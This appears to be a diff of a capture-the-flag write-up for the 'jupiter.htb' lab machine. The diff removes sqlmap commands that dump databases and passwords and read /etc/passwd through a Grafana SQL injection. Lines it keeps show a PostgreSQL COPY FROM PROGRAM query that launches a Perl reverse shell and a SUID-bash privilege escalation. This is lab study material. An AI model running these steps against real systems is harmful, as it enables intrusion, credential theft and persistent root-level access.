@@ -5,65 +5,13 @@
 - port 22 SSH OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 - port 80 HTTP nginx 1.18.0 (Ubuntu)
 
-jupiter.htb directories
+Subdomain enumeration found kiosk subdomain, a grafana dashboard.
 
-/.htaccess            (Status: 403) [Size: 162]
-/.htpasswd            (Status: 403) [Size: 162]
-/css                  (Status: 301) [Size: 178] [--> http://jupiter.htb/css/]
-/fonts                (Status: 301) [Size: 178] [--> http://jupiter.htb/fonts/]
-/img                  (Status: 301) [Size: 178] [--> http://jupiter.htb/img/]
-/js                   (Status: 301) [Size: 178] [--> http://jupiter.htb/js/]
-/Source               (Status: 301) [Size: 178] [--> http://jupiter.htb/Source/]
-/sass                 (Status: 301) [Size: 178] [--> http://jupiter.htb/sass/]
-
-/sass indicates use of [sass-lang](https://sass-lang.com/guide/). Potential vulnerabilities (RCE)
-
-Subdomain enumeration found kiosk subdomain, a grafana dashboard. Potential parameter injection
-
-Grafana version 9.5.2, CVE-2023-0507 (stored XSS core plugin GeoMap), CVE-2023-2801 (Crash endpoint)
-
-kiosk.jupiter.htb directories
-
-/login                (Status: 200) [Size: 34390]
-/metrics              (Status: 200) [Size: 129877]
-/monitoring           (Status: 200) [Size: 34390]
-/playlists            (Status: 200) [Size: 34390]
-/robots.txt           (Status: 200) [Size: 26]
-/signup               (Status: 200) [Size: 34390]
-/styleguide           (Status: 200) [Size: 34390]
-/verify               (Status: 200) [Size: 34390]
-
-/public/public        (Status: 302) [Size: 31] [--> /public/]
-/public/app           (Status: 302) [Size: 35] [--> /public/app/]
-/public/build         (Status: 302) [Size: 37] [--> /public/build/]
-/public/emails        (Status: 302) [Size: 38] [--> /public/emails/]
-/public/fonts         (Status: 302) [Size: 37] [--> /public/fonts/]
-/public/img           (Status: 302) [Size: 35] [--> /public/img/]
-/public/lib           (Status: 302) [Size: 35] [--> /public/lib/]
-/public/locales       (Status: 302) [Size: 39] [--> /public/locales/]
-/public/maps          (Status: 302) [Size: 36] [--> /public/maps/]
-/public/robots.txt    (Status: 200) [Size: 26]
-/public/test          (Status: 302) [Size: 36] [--> /public/test/]
-/public/views         (Status: 302) [Size: 37] [--> /public/views/]
-/public/vendor        (Status: 302) [Size: 38] [--> /public/vendor/]
-
-/api/live/ws looks like a websocket connection, when navigating to it the respoinse is bad request
-
-/api/ds/query sql injection
+/api/ds/query is vulnearble to sql injection
 
 found user grafana_viewer
 
 PostgreSQL version 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)
-
-```
-sqlmap -r grafana.sql -p "rawSql" --dump
-sqlmap -r grafana.sql -p "rawSql" --dbs
-sqlmap -r grafana.sql -p "rawSql" --tables
-sqlmap -r grafana.sql -p "rawSql" --columns
-sqlmap -r grafana.sql -p "rawSql" --users
-sqlmap -r grafana.sql -p "rawSql" --passwords
-sqlmap -r grafana.sql -p "rawSql" --file-read "/etc/passwd"
-```
 
 Tried dumping the moons DB but contains 160+ entries so very time consuming and ultimately useless. Used the 
 following write ups to discover the PostgreSQL RCE query:
@@ -93,11 +41,14 @@ COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::I
 
 Privesc to juno through network-simulation.yml file in /dev/shm, found with pspy
 
-Edit server and host processes to create a bash binary with juno's permissions
+Edit server and host processes values in network-simulation.yml to create a bash binary with juno's 
+permissions
 
 ```
+# server
 /usr/bin/cp /bin/bash /tmp/bash
 
+#host
 /usr/bin/chmod u+s /tmp/bash 
 ```
 
